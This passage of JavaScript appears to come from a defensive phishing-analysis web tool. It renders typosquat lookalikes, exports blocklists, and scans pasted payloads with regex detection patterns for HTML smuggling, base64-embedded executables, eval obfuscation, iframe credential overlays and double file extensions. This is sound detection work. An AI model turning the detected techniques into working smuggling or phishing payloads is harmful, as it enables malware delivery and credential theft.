                      + '  <td class="radar-domain-cell">'
                      + '    ' + escapeHtml(item.domain)
                      +      (item.punycode ? '<span class="radar-punycode-text">Punycode: ' + escapeHtml(item.punycode) + '</span>' : '')
                      + '  </td>'
                      + '  <td><span class="radar-tech-badge">' + escapeHtml(item.categoryLabel) + '</span></td>'
                      + '  <td>' + escapeHtml(item.desc) + '</td>'
                      + '  <td><span class="radar-risk-badge ' + riskClass + '">' + escapeHtml(item.riskLabel) + '</span></td>'
                      + '  <td class="radar-copy-cell"><button type="button" class="radar-copy-btn" data-copy="' + escapeHtml(item.domain) + '">Copy</button></td>'
                      + '</tr>';
        });

        tbody.innerHTML = rowsHtml;

        tbody.querySelectorAll('.radar-copy-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const text = btn.dataset.copy;
                navigator.clipboard.writeText(text).then(() => {
                    const orig = btn.textContent;
                    btn.textContent = '✓';
                    btn.style.color = '#00ff9c';
                    setTimeout(() => {
                        btn.textContent = orig;
                        btn.style.color = '';
                    }, 1200);
                });
            });
        });
    }

    // ================================================================
    //  EXPORT REPORT HELPERS
    async function handleRadarAiDefense() {
        if (!radarCurrentResults) {
            handleRadarGenerate();
            if (!radarCurrentResults) return;
        }

        const data = radarCurrentResults;
        const target = data.target.full;
        const criticals = data.variants.filter(v => v.risk === 'critical').slice(0, 10).map(v => v.domain + (v.punycode ? ' (' + v.punycode + ')' : ''));

        const aiContainer = $('#radarAiContainer');
        if (aiContainer) {
            aiContainer.innerHTML = '<div class="radar-ai-card"><div class="radar-ai-header"><span class="radar-ai-title">🤖 AI Brand Defense Advisory</span><span style="font-size:0.8rem; color:#8b949e;">Generating tailored strategy…</span></div><div class="loading" style="padding:16px 0;"><div class="spinner"></div><span>Synthesizing brand protection strategy and monitoring dorks…</span></div></div>';
        }

        setRadarLoading(true, 'Synthesizing proactive brand defense strategy…');

        const prompt = `You are a Principal Threat Intelligence Analyst & Brand Protection Specialist.
Analyze the target brand domain "${target}" and the following critical typosquat/lookalike candidates:
${criticals.join('\n')}

Provide an actionable, structured Brand Defense & Anti-Phishing Dossier covering:
1. 🛡️ TOP DEFENSIVE ACQUISITIONS & MONITORING: High-priority lookalikes to defensively register or add to Certificate Transparency (CT) log monitors.
2. 🔒 EMAIL & DNS REPUTATION HARDENING: Key requirements for DMARC (p=reject), SPF strict alignment, DKIM selector rotation, and CAA/BIMI authentication.
3. 🔎 PROACTIVE THREAT HUNTING DORKS: 3-4 precise Google / Shodan / URLScan search dorks to detect phishing kits and fake login clones targeting this brand.
4. 👥 EMPLOYEE / CUSTOMER DEFENSE ADVISORY: Specific visual traps and cues to include in corporate security awareness briefings.

Be concise, authoritative, and practical. Format with clear headings and bullet points.`;

        let adviceText = '';
        try {
            if (aiProvider === 'gemini' && apiKey) {
                adviceText = await callGeminiBrandAdvice(prompt);
            } else if (aiProvider === 'openai' && apiKey) {
                adviceText = await callOpenAiBrandAdvice(prompt);
            } else {
                adviceText = generateLocalBrandAdvice(data);
            }
        } catch (err) {
            adviceText = generateLocalBrandAdvice(data);
        } finally {
            setRadarLoading(false);
        }

        if (aiContainer) {
            aiContainer.innerHTML = '<div class="radar-ai-card">'
                                  + '<div class="radar-ai-header">'
                                  + '  <span class="radar-ai-title">🤖 AI Brand Defense &amp; Anti-Phishing Advisory (' + escapeHtml(aiProvider === 'gemini' ? 'Google Gemini' : aiProvider === 'openai' ? 'OpenAI GPT-4o-mini' : 'Built-in Heuristic SOC') + ')</span>'
                                  + '  <button type="button" class="btn-link" id="btnCopyAiAdvice" style="font-size:0.78rem;">Copy Advice</button>'
                                  + '</div>'
                                  + '<div class="radar-ai-content">' + escapeHtml(adviceText) + '</div>'
                                  + '</div>';

            const copyAdviceBtn = $('#btnCopyAiAdvice');
            if (copyAdviceBtn) {
                copyAdviceBtn.addEventListener('click', () => {
                    navigator.clipboard.writeText(adviceText).then(() => {
                        const orig = copyAdviceBtn.textContent;
                        copyAdviceBtn.textContent = '✅ Copied!';
                        setTimeout(() => { copyAdviceBtn.textContent = orig; }, 1500);
                    });
                });
            }
        }
    }
    async function callGeminiBrandAdvice(prompt) {
        const url = `${GEMINI_ENDPOINT}?key=${apiKey}`;
        const body = {
            contents: [{ parts: [{ text: prompt }] }],
            generationConfig: { temperature: 0.2, maxOutputTokens: 1000 }
        };
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        if (!res.ok) throw new Error(`Gemini API error: ${res.status}`);
        const json = await res.json();
        return json.candidates[0].content.parts[0].text;
    }

    async function callOpenAiBrandAdvice(prompt) {
        const res = await fetch(OPENAI_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${apiKey}`
            },
            body: JSON.stringify({
                model: 'gpt-4o-mini',
                messages: [{ role: 'user', content: prompt }],
                temperature: 0.2,
                max_tokens: 1000
            })
        });
        if (!res.ok) throw new Error(`OpenAI API error: ${res.status}`);
        const json = await res.json();
        return json.choices[0].message.content;
    }

    function generateLocalBrandAdvice(data) {
        const target = data.target.full;
        const brand = data.target.label;
        const topCriticals = data.variants.filter(v => v.risk === 'critical').slice(0, 5).map(v => v.domain).join(', ');

        return `## 🛡️ Brand Defense & Anti-Typosquatting Dossier for ${target}\n\n`
             + `### 1. High-Priority Defensive Acquisitions & CT Log Monitoring\n`
             + `- **Immediate Threat Vectors:** Register or monitor top credential keyword combinations (${topCriticals}).\n`
             + `- **Certificate Transparency (CT) Alerts:** Subscribe to CertStream or crt.sh alerts for new SSL/TLS certificates matching "*${brand}*".\n`
             + `- **Takedown Escalation:** Flag abusive registrar accounts hosting homoglyphic punycode clones under UDRP / Uniform Rapid Suspension.\n\n`
             + `### 2. Email & DNS Authentication Posture\n`
             + `- **DMARC Enforcement:** Set policy to strict rejection: \`v=DMARC1; p=reject; sp=reject; pct=100; rua=mailto:dmarc-reports@${target};\`\n`
             + `- **SPF Hardfail Alignment:** Disallow unauthorized envelope-from IPs with \`-all\` rather than softfail (\`~all\`).\n`
             + `- **DKIM & BIMI:** Implement 2048-bit DKIM keys and verified Brand Indicators for Message Identification (BIMI) to ensure visual mailbox verification.\n\n`
             + `### 3. Proactive Phishing Kit Threat Hunting Dorks\n`
             + `- \`intitle:"${brand} Login" inurl:(login OR signin OR auth) -site:${target}\`\n`
             + `- \`"${brand}" "Sign In to Your Account" (filetype:php OR filetype:html) -site:${target}\`\n`
             + `- \`http.html:"${brand}" AND NOT http.domain:"${target}"\` (via URLScan / Shodan)\n\n`
             + `### 4. Employee & User Defense Briefing\n`
             + `- Train employees to scrutinize subdomains (e.g. noticing \`${brand}.com.attacker-gateway.top\` is NOT an authentic ${target} asset).\n`
             + `- Mandate FIDO2 / WebAuthn hardware security keys, which are mathematically immune to typosquatting and AitM reverse proxies.`;
    }

    function copyRadarDomainList() {
        if (!radarCurrentResults) return;
        const domains = radarCurrentResults.variants.map(v => v.domain).join('\n');
        const btn = $('#btnCopyRadarList');
        navigator.clipboard.writeText(domains).then(() => {
            if (btn) {
                const orig = btn.textContent;
                btn.textContent = '✅ Copied ' + radarCurrentResults.variants.length + ' Domains!';
                setTimeout(() => { btn.textContent = orig; }, 2000);
            }
        });
    }

    function exportRadarDnsBlocklist() {
        if (!radarCurrentResults) return;
        const target = radarCurrentResults.target.full;
        let content = `# Phish-Guard DNS / Hosts Blocklist for ${target}\n`;
        content += `# Generated: ${new Date().toISOString()}\n`;
        content += `# Total Permutations: ${radarCurrentResults.variants.length}\n\n`;
        radarCurrentResults.variants.forEach(v => {
            content += `0.0.0.0 ${v.domain}\n`;
            if (v.punycode && v.punycode !== v.domain) {
                content += `0.0.0.0 ${v.punycode}\n`;
            }
        });

        const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `phishguard-blocklist-${target}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    function exportRadarCsv() {
        if (!radarCurrentResults) return;
        const target = radarCurrentResults.target.full;
        let csv = 'Domain,Punycode,Category,Risk_Tier,Risk_Score,Threat_Description\n';
        radarCurrentResults.variants.forEach(v => {
            const desc = (v.desc || '').replace(/"/g, '""');
            csv += `"${v.domain}","${v.punycode || ''}","${v.categoryLabel}","${v.riskLabel}",${v.score},"${desc}"\n`;
        });

        const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `phishguard-lookalikes-${target}.csv`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    // ================================================================
    //  TAB 5: PAYLOAD & HTML SMUGGLING INSPECTOR ENGINE
    // ================================================================
    function initPayloadFileDrop() {
        if (!dom.payloadDropZone || !dom.payloadFileInput) return;

        dom.payloadDropZone.addEventListener('click', () => {
            dom.payloadFileInput.click();
        });

        dom.payloadFileInput.addEventListener('change', (e) => {
            const file = e.target.files[0];
            if (file) loadPayloadFile(file);
        });

        ['dragenter', 'dragover'].forEach(name => {
            dom.payloadDropZone.addEventListener(name, (e) => {
                e.preventDefault();
                e.stopPropagation();
                dom.payloadDropZone.classList.add('dragover');
            });
        });

        ['dragleave', 'drop'].forEach(name => {
            dom.payloadDropZone.addEventListener(name, (e) => {
                e.preventDefault();
                e.stopPropagation();
                dom.payloadDropZone.classList.remove('dragover');
            });
        });

        dom.payloadDropZone.addEventListener('drop', (e) => {
            const dt = e.dataTransfer;
            const file = dt.files[0];
            if (file) loadPayloadFile(file);
        });
    }

    function loadPayloadFile(file) {
        const reader = new FileReader();
        reader.onload = (e) => {
            if (dom.payloadInput) {
                dom.payloadInput.value = e.target.result;
                if (dom.payloadResultArea) dom.payloadResultArea.innerHTML = '';
                if (dom.payloadDropPrompt) {
                    dom.payloadDropPrompt.querySelector('.payload-drop-text').innerHTML =
                        'Loaded: <strong style="color:#00ff9c;">' + escapeHtml(file.name) + '</strong> (' + Math.round(file.size / 1024) + ' KB)';
                }
                handlePayloadScan();
            }
        };
        reader.readAsText(file);
    }

    function setPayloadLoading(on, text = '') {
        if (dom.payloadLoading) dom.payloadLoading.classList.toggle('hidden', !on);
        if (dom.payloadStatusText && text) dom.payloadStatusText.textContent = text;
        if (dom.analyzePayloadBtn) dom.analyzePayloadBtn.disabled = on;
    }

    function showPayloadError(msg) {
        if (dom.payloadResultArea) {
            dom.payloadResultArea.innerHTML = '<div class="error-box">⚠️ ' + escapeHtml(msg) + '</div>';
        }
    }

    async function handlePayloadScan() {
        if (!dom.payloadInput) return;
        const raw = dom.payloadInput.value.trim();
        if (!raw) {
            showPayloadError('Please paste or upload payload code (HTML, SVG, JavaScript, or MIME content).');
            return;
        }

        setPayloadLoading(true, 'De-obfuscating Base64 blobs, parsing script hooks & analyzing download constructors…');

        setTimeout(async () => {
            try {
                const analysis = inspectPayload(raw);

                // Check if AI is enabled for deep code summary
                if (aiProvider === 'gemini' && apiKey) {
                    setPayloadLoading(true, 'Synthesizing neural reverse-engineering summary with Gemini 1.5 Flash…');
                    analysis.aiSummary = await callGeminiPayloadAnalysis(raw, analysis);
                    analysis.engine = 'Google Gemini 1.5 Flash';
                } else if (aiProvider === 'openai' && apiKey) {
                    setPayloadLoading(true, 'Synthesizing neural reverse-engineering summary with GPT-4o-mini…');
                    analysis.aiSummary = await callOpenAiPayloadAnalysis(raw, analysis);
                    analysis.engine = 'OpenAI GPT-4o-mini';
                } else {
                    analysis.aiSummary = generateLocalPayloadSummary(analysis);
                    analysis.engine = 'Local Payload De-obfuscation Engine';
                }

                renderPayloadResults(analysis);
            } catch (err) {
                showPayloadError('Error analyzing payload: ' + err.message);
            } finally {
                setPayloadLoading(false);
            }
        }, 120);
    }
    function inspectPayload(raw) {
        let riskScore = 0;
        const findings = [];
        const extractedBlobs = [];
        const isHtml = /<html|<body|<script|<div|<iframe|<svg|<!DOCTYPE/i.test(raw);

        // 1. HTML Smuggling & Blob Assembly
        const hasBlob = /new\s+Blob\s*\(/i.test(raw);
        const hasCreateObjectUrl = /URL\.createObjectURL|webkitURL\.createObjectURL/i.test(raw);
        const hasMsSaveBlob = /msSaveOrOpenBlob|msSaveBlob/i.test(raw);
        const hasAutoDownload = /\.download\s*=|setAttribute\s*\(\s*['"]download['"]/i.test(raw);
        const hasSimulatedClick = /\.click\s*\(\s*\)|dispatchEvent\s*\(/i.test(raw);

        let smugglingStatus = 'pass';
        let smugglingLabel = 'No Smuggling Detected';
        let smugglingDetail = 'No dynamic Blob or object URL file assembly constructors found.';

        if ((hasBlob || hasCreateObjectUrl || hasMsSaveBlob) && (hasAutoDownload || hasSimulatedClick)) {
            smugglingStatus = 'fail';
            smugglingLabel = 'HTML Smuggling Detected (Qakbot / Nobelium Vector)';
            smugglingDetail = 'Assembles binary files in memory via Blob/createObjectURL and simulates anchor clicks to bypass email gateway filters.';
            riskScore += 45;
            findings.push({
                severity: 'danger',
                icon: '🚨',
                title: 'HTML Smuggling Execution Vector',
                detail: 'Script constructs a local file Blob dynamically and invokes automatic download without explicit user consent.'
            });
        } else if (hasBlob || hasCreateObjectUrl) {
            smugglingStatus = 'warn';
            smugglingLabel = 'Dynamic Blob Constructor Present';
            smugglingDetail = 'Detected client-side Blob or ObjectURL creation.';
            riskScore += 20;
        }

        // 2. Base64 Payload Extraction & PE Header / Script De-obfuscation
        const b64Regex = /(?:['"])([A-Za-z0-9+/]{40,}={0,2})(?:['"])/g;
        let match;
        let b64Count = 0;
        let peHeaderFound = false;
        let base64Status = 'pass';
        let base64Label = 'Clean / No Large Encoded Payloads';
        let base64Detail = 'No suspicious base64 payloads detected.';

        while ((match = b64Regex.exec(raw)) !== null) {
            b64Count++;
            const b64Str = match[1];
            try {
                let decoded = '';
                if (typeof atob === 'function') {
                    decoded = atob(b64Str);
                } else {
                    decoded = Buffer.from(b64Str, 'base64').toString('latin1');
                }

                const isPe = decoded.startsWith('MZ') || decoded.includes('This program cannot be run in DOS mode');
                if (isPe) {
                    peHeaderFound = true;
                    riskScore += 50;
                    findings.push({
                        severity: 'danger',
                        icon: '💣',
                        title: 'Embedded Windows PE Executable (MZ Signature)',
                        detail: 'Base64 string contains a compiled executable binary disguised inside the script.'
                    });
                }

                extractedBlobs.push({
                    index: b64Count,
                    length: b64Str.length,
                    isPe: isPe,
                    preview: decoded.substring(0, 150).replace(/[^\x20-\x7E]/g, '.'),
                    rawB64: b64Str.length > 80 ? b64Str.substring(0, 80) + '…' : b64Str
                });
            } catch (e) {
                // Not valid base64
            }
        }

        if (peHeaderFound) {
            base64Status = 'fail';
            base64Label = 'Malicious Binary / PE Executable Embedded';
            base64Detail = 'Extracted Windows PE / DOS header (MZ) from embedded Base64 payload.';
        } else if (b64Count > 0) {
            base64Status = 'warn';
            base64Label = `Detected ${b64Count} Base64 Encoded Block(s)`;
            base64Detail = 'Payload contains obfuscated or base64-encoded strings.';
            riskScore += 15;
            findings.push({
                severity: 'warn',
                icon: '📦',
                title: 'Large Base64 String Encapsulation',
                detail: `Extracted ${b64Count} large Base64 blocks exceeding 40 characters.`
            });
        }

        // 3. Obfuscated Script Execution (eval, unescape, Function)
        const hasEval = /eval\s*\(|new\s+Function\s*\(|document\.write\s*\(/i.test(raw);
        const hasUnescape = /unescape\s*\(|decodeURIComponent\s*\(/i.test(raw);
        const hasHexEscape = /(?:\\x[0-9a-f]{2}|%[0-9a-f]{2}){4,}/i.test(raw);

        let scriptStatus = 'pass';
        let scriptLabel = 'Standard Script Execution';
        let scriptDetail = 'No dynamic code evaluation or hex-escaped execution strings found.';

        if (hasEval && (hasUnescape || hasHexEscape)) {
            scriptStatus = 'fail';
            scriptLabel = 'Evasive eval(unescape(...)) Obfuscation';
            scriptDetail = 'Executes hidden code dynamically via eval and hex unescaping routines.';
            riskScore += 35;
            findings.push({
                severity: 'danger',
                icon: '⚡',
                title: 'Obfuscated Dynamic Code Evaluation',
                detail: 'Uses eval(unescape(...)) or hex string arrays to hide malicious command execution from static scanners.'
            });
        } else if (hasEval) {
            scriptStatus = 'warn';
            scriptLabel = 'Dynamic eval() Call';
            scriptDetail = 'Contains eval() or new Function() code evaluation.';
            riskScore += 15;
        }

        // 4. Hidden Iframe & Credential Phishing Cloaks
        const hasIframe = /<iframe[^>]*src=["'](https?:\/\/[^"']+)["']/i.test(raw);
        const hasHiddenIframe = /position:\s*fixed|width:\s*100vw|height:\s*100vh|opacity:\s*0|display:\s*none/i.test(raw);
        const hasFormSteal = /<form[^>]*action=["'](https?:\/\/[^"']+)["']/i.test(raw) || /fetch\s*\(\s*['"](https?:\/\/[^'"]+)['"]\s*,\s*\{\s*method:\s*['"]POST['"]/i.test(raw);

        let iframeStatus = 'pass';
        let iframeLabel = 'No Hidden Iframes';
        let iframeDetail = 'No full-screen iframe overlays or credential exfiltration forms detected.';

        if (hasIframe && (hasHiddenIframe || hasFormSteal)) {
            iframeStatus = 'fail';
            iframeLabel = 'Full-Screen Iframe Phishing Cloak';
            iframeDetail = 'Overlays a fake login portal inside a full-screen iframe and intercepts victim keystrokes.';
            riskScore += 40;
            findings.push({
                severity: 'danger',
                icon: '🪟',
                title: 'Iframe Credential Overlay',
                detail: 'Embeds an external login portal in a 100vw/100vh iframe while exfiltrating credentials to an external server.'
            });
        }

        // 5. Dangerous & Disguised Double File Extensions
        const doubleExtRegex = /(?:href|download|name)=["']?([^"'>\s]+\.(?:pdf|docx|xlsx|jpg|png|txt)\.(?:exe|vbs|iso|scr|hta|bat|cmd|ps1|msi|wsf))["']?/gi;
        const dangerousExts = [];
        let dMatch;
        while ((dMatch = doubleExtRegex.exec(raw)) !== null) {
            dangerousExts.push(dMatch[1]);
        }

        let extStatus = 'pass';
        let extLabel = 'Standard Extensions';
        let extDetail = 'No deceptive double-extension filenames detected.';

        if (dangerousExts.length > 0) {
            extStatus = 'fail';
            extLabel = `Deceptive Double Extension (${dangerousExts.length} File${dangerousExts.length > 1 ? 's' : ''})`;
            extDetail = `Disguised executable payload: ${dangerousExts.join(', ')}`;
            riskScore += 45;
            findings.push({
                severity: 'danger',
                icon: '🎭',
                title: 'Deceptive Double File Extension',
                detail: `Payload uses double extensions (${dangerousExts.join(', ')}) to trick users into executing binaries disguised as documents.`
            });
        }

        // 6. SVG Script Injections
        if (/<svg/i.test(raw) && (/<script/i.test(raw) || /onload\s*=/i.test(raw) || /window\.location/i.test(raw))) {
            riskScore += 35;
            findings.push({
                severity: 'danger',
                icon: '🖼️',
                title: 'Malicious SVG Script Injection (XSS / Redirection)',
                detail: 'Vector graphics file embeds executable JavaScript to force immediate redirection or session hijacking.'
            });
        }

        riskScore = Math.min(100, riskScore);

        let verdict = 'SAFE / BENIGN PAYLOAD';
        let verdictClass = 'verdict-clean';
        if (riskScore >= 70) {
            verdict = 'CRITICAL MALICIOUS PAYLOAD';
            verdictClass = 'verdict-danger';
        } else if (riskScore >= 35) {
            verdict = 'SUSPICIOUS / OBFUSCATED PAYLOAD';
            verdictClass = 'verdict-suspicious';
        }

        return {
            riskScore,
            verdict,
            verdictClass,
            matrix: {
                smuggling: { status: smugglingStatus, label: smugglingLabel, detail: smugglingDetail },
                base64: { status: base64Status, label: base64Label, detail: base64Detail },
                script: { status: scriptStatus, label: scriptLabel, detail: scriptDetail },
                iframe: { status: iframeStatus, label: iframeLabel, detail: iframeDetail },
                extension: { status: extStatus, label: extLabel, detail: extDetail }
            },
            extractedBlobs,
            dangerousExts,
            findings
        };
    }

    function renderPayloadResults(data) {
        if (!dom.payloadResultArea) return;

        let matrixHtml = `
            <div class="result-card">
                <div class="section-title">🛡️ Smuggling &amp; Payload Evasion Matrix</div>
                <div class="auth-matrix">
        `;

        const keys = [
            { key: 'smuggling', title: 'HTML Smuggling / Blob Assembly' },
            { key: 'base64', title: 'Base64 Encoded Binary Extraction' },
            { key: 'script', title: 'Dynamic Eval & String Obfuscation' },
            { key: 'iframe', title: 'Iframe Overlay & Form Interception' },
            { key: 'extension', title: 'Double Extensions & Executables' }
        ];

        keys.forEach(k => {
            const item = data.matrix[k.key];
            matrixHtml += `
                <div class="auth-col ${item.status}">
                    <div class="auth-badge ${item.status}">${item.status.toUpperCase()}</div>
                    <div class="auth-mechanism">${k.title}</div>
                    <div class="auth-detail">${escapeHtml(item.label)}</div>
                    <div style="font-size: 0.72rem; color: #8b949e; margin-top: 4px;">${escapeHtml(item.detail)}</div>
                </div>
            `;
        });
        matrixHtml += `</div></div>`;

        let blobsHtml = '';
        if (data.extractedBlobs && data.extractedBlobs.length > 0) {
            blobsHtml = `
                <div class="result-card">
                    <div class="section-title">🧪 Extracted &amp; Decoded In-Memory Blobs (${data.extractedBlobs.length})</div>
            `;
            data.extractedBlobs.forEach(b => {
                blobsHtml += `
                    <div class="payload-code-viewer">
                        <div class="payload-code-header">
                            <span>Block #${b.index} &bull; ${b.length} chars ${b.isPe ? '<strong style="color:#ef4444;">[⚠️ Windows PE Binary Detected]</strong>' : ''}</span>
                            <span>Safe Sandbox Preview</span>
                        </div>
                        <pre class="payload-code-body"><code>${escapeHtml(b.preview || b.rawB64)}</code></pre>
                    </div>
                `;
            });
            blobsHtml += `</div>`;
        }

        let findingsHtml = '';
        if (data.findings && data.findings.length > 0) {
            findingsHtml = `
                <div class="result-card">
                    <div class="section-title">🔍 Forensic Deconstruction Findings (${data.findings.length})</div>
                    <div class="sim-feedback-flags" style="margin-top: 10px;">
            `;
            data.findings.forEach(f => {
                findingsHtml += `
                    <div class="flag-item" style="border-left: 3px solid ${f.severity === 'danger' ? '#ef4444' : '#f59e0b'}; background: #0d1117; padding: 10px 14px; border-radius: 6px; margin-bottom: 8px;">
                        <div style="font-weight: 600; color: ${f.severity === 'danger' ? '#fca5a5' : '#fde68a'}; display:flex; align-items:center; gap: 6px;">
                            <span>${f.icon}</span> ${escapeHtml(f.title)}
                        </div>
                        <div style="font-size: 0.82rem; color: #94a3b8; margin-top: 4px;">${escapeHtml(f.detail)}</div>
                    </div>
                `;
            });
            findingsHtml += `</div></div>`;
        }
        let aiHtml = '';
        if (data.aiSummary) {
            aiHtml = `
                <div class="radar-ai-card">
                    <div class="radar-ai-header">
                        <span class="radar-ai-title">🤖 SOC Reverse-Engineering &amp; De-obfuscation Summary</span>
                        <span class="engine-badge">${escapeHtml(data.engine || 'Forensic Engine')}</span>
                    </div>
                    <div class="radar-ai-content">${escapeHtml(data.aiSummary)}</div>
                </div>
            `;
        }

        const html = `
            <div class="result-card verdict-card ${data.verdictClass}">
                <div class="verdict-top">
                    <div class="verdict-label">
                        <span class="verdict-icon">${data.riskScore >= 70 ? '🚨' : data.riskScore >= 35 ? '⚠️' : '✅'}</span>
                        <div>
                            <div class="verdict-title">${data.verdict}</div>
                            <div class="verdict-sub">Payload Risk Score: ${data.riskScore}/100 &bull; ${data.findings.length} Forensic Indicators</div>
                        </div>
                    </div>
                    <span class="engine-badge">${escapeHtml(data.engine || 'Local Engine')}</span>
                </div>
            </div>

            ${matrixHtml}
            ${blobsHtml}
            ${findingsHtml}
            ${aiHtml}

            <div style="text-align: right; margin-top: 14px;">
                <button type="button" id="btnCopyPayloadReport" class="radar-export-btn">
                    📋 Copy SOC Incident Dossier (Markdown)
                </button>
            </div>
        `;

        dom.payloadResultArea.innerHTML = html;
        dom.payloadResultArea.scrollIntoView({ behavior: 'smooth', block: 'start' });

        const btnCopy = $('#btnCopyPayloadReport');
        if (btnCopy) {
            btnCopy.addEventListener('click', () => {
                copyPayloadReport(data);
            });
        }
    }

    function copyPayloadReport(data) {
        let md = `# Phish-Guard Payload & Smuggling Forensic Dossier\n`;
        md += `- **Date/Time:** ${new Date().toUTCString()}\n`;
        md += `- **Verdict:** ${data.verdict}\n`;
        md += `- **Risk Score:** ${data.riskScore}/100\n`;
        md += `- **Analysis Engine:** ${data.engine || 'Phish-Guard Core'}\n\n`;

        md += `## Smuggling & Payload Matrix\n`;
        Object.keys(data.matrix).forEach(k => {
            const m = data.matrix[k];
            md += `- **${k.toUpperCase()}:** [${m.status.toUpperCase()}] ${m.label} - ${m.detail}\n`;
        });

        if (data.findings && data.findings.length > 0) {
            md += `\n## Forensic Findings\n`;
            data.findings.forEach(f => {
                md += `- ${f.icon} **${f.title}**: ${f.detail}\n`;
            });
        }

        if (data.aiSummary) {
            md += `\n## SOC De-obfuscation & Incident Summary\n${data.aiSummary}\n`;
        }

        const btn = $('#btnCopyPayloadReport');
        navigator.clipboard.writeText(md).then(() => {
            if (btn) {
                const orig = btn.textContent;
                btn.textContent = '✅ Copied Forensic Dossier!';
                setTimeout(() => { btn.textContent = orig; }, 2000);
            }
        });
    }

    async function callGeminiPayloadAnalysis(raw, analysis) {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey}`;
        const prompt = `You are a Principal SOC Malware & Phishing Reverse Engineer. Analyze this suspicious payload snippet or HTML smuggling attachment:
${raw.substring(0, 3000)}

Detected Indicators:
- Verdict: ${analysis.verdict} (Risk Score: ${analysis.riskScore}/100)
- Findings: ${analysis.findings.map(f => f.title).join(', ')}

Provide a concise, expert SOC triage briefing formatted with clear headings:
### 1. Payload Mechanism & Evasion Technique (Explain how the script or payload works)
### 2. Execution Flow & Attack Chain (Step-by-step trigger analysis)
### 3. Immediate SOC Containment & EDR Hunting Rule (Specific Sigma or Splunk / Defender KQL hunt)`;

        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                contents: [{ parts: [{ text: prompt }] }],
                generationConfig: { temperature: 0.2, maxOutputTokens: 600 }
            })
        });

        if (!res.ok) throw new Error(`Gemini API Error: ${res.statusText}`);
        const json = await res.json();
        return json.candidates[0].content.parts[0].text;
    }

    async function callOpenAiPayloadAnalysis(raw, analysis) {
        const url = 'https://api.openai.com/v1/chat/completions';
        const prompt = `You are a Principal SOC Malware & Phishing Reverse Engineer. Analyze this suspicious payload snippet or HTML smuggling attachment:
${raw.substring(0, 3000)}

Detected Indicators:
- Verdict: ${analysis.verdict} (Risk Score: ${analysis.riskScore}/100)
- Findings: ${analysis.findings.map(f => f.title).join(', ')}

Provide a concise, expert SOC triage briefing formatted with clear headings:
### 1. Payload Mechanism & Evasion Technique (Explain how the script or payload works)
### 2. Execution Flow & Attack Chain (Step-by-step trigger analysis)
### 3. Immediate SOC Containment & EDR Hunting Rule (Specific Sigma or Splunk / Defender KQL hunt)`;

        const res = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${apiKey}`
            },
            body: JSON.stringify({
                model: 'gpt-4o-mini',
                messages: [{ role: 'user', content: prompt }],
                temperature: 0.2,
                max_tokens: 600
            })
        });

        if (!res.ok) throw new Error(`OpenAI API Error: ${res.statusText}`);
        const json = await res.json();
        return json.choices[0].message.content;
    }

    function generateLocalPayloadSummary(analysis) {
        if (analysis.riskScore < 30) {
            return `### 1. Payload Mechanism & Evasion Technique\n- Analysis confirms no dynamic binary assembly, obfuscated eval execution, or credential exfiltration hooks.\n- Content resembles standard HTML or legitimate styling.\n\n### 2. Execution Flow & Attack Chain\n- Static layout without active client-side malware dropper payloads.\n\n### 3. SOC Containment & Action\n- No endpoint containment required. File is safe for standard delivery.`;
        }

        return `### 1. Payload Mechanism & Evasion Technique\n`
            + `- **Deception Vector:** Uses ${analysis.findings.map(f => f.title).slice(0, 2).join(' & ')}.\n`
            + `- **Gateway Bypass:** Employs in-memory binary decoding or simulated clicks to circumvent perimeter secure email gateways (SEGs).\n\n`
            + `### 2. Execution Flow & Attack Chain\n`
            + `1. Victim opens disguised HTML attachment or web page.\n`
            + `2. Injected JavaScript executes without explicit warning, unpacking Base64 or Blob payloads into memory.\n`
            + `3. Triggers automatic file download or credential harvesting form submission.\n\n`
            + `### 3. Immediate SOC Containment & EDR Hunting Rule\n`
            + `- **Microsoft Defender / Sentinel KQL Hunt:**\n`
            + `\`\`\`kql\n`
            + `DeviceEvents\n`
            + `| where ActionType == "BrowserDownloadedFile" and FileName endswith_any (".iso", ".vbs", ".exe", ".hta")\n`
            + `| where InitiatingProcessFileName in~ ("chrome.exe", "msedge.exe", "firefox.exe")\n`
            + `\`\`\`\n`
            + `- **Containment:** Block source domains at perimeter firewall and isolate endpoints downloading unrecognized archive or executable payloads.`;
    }




    // ================================================================
    function generateMarkdownReport() {
        if (!lastScanData) return '';
        const d = lastScanData;
        let md = `# Phish-Guard Threat Analysis Report\n\n`;
        md += `- **Date/Time:** ${d.timestamp}\n`;
        md += `- **Engine:** ${d.engine}\n`;
        md += `- **Verdict:** ${d.analysis.verdict}\n`;
        md += `- **Risk Score:** ${d.analysis.riskScore} / 100\n\n`;
        md += `## Detected Techniques\n`;
        d.analysis.techniques.forEach(t => { md += `- ${t}\n`; });
        md += `\n## Threat Summary\n${d.analysis.summary}\n\n`;
        md += `## Recommended Actions\n`;
        d.analysis.recommendations.forEach(r => { md += `- ${r}\n`; });
        if (d.analysis.psychTriggers && d.analysis.psychTriggers.length) {
            md += `\n## Psychological Tactics Exploited\n`;
            d.analysis.psychTriggers.forEach(t => {
                md += `- ${t.icon || ''} ${t.name} (${t.severity || 'med'}): ${t.description || ''}\n`;
            });
        }
        if (d.analysis.plainEnglish) {
            md += `\n## Plain-English Summary\n${d.analysis.plainEnglish.tlDr || ''}\n`;
        }
        if (d.urls.length) {
            md += `\n## Extracted URLs\n`;
            d.urls.forEach(u => { md += `- \`${u}\`\n`; });
        }
        if (d.vtResults && d.vtResults.length) {
            md += `\n## VirusTotal Intel\n`;
            d.vtResults.forEach(r => {
                if (r.error) md += `- ${r.url}: Error (${r.error})\n`;
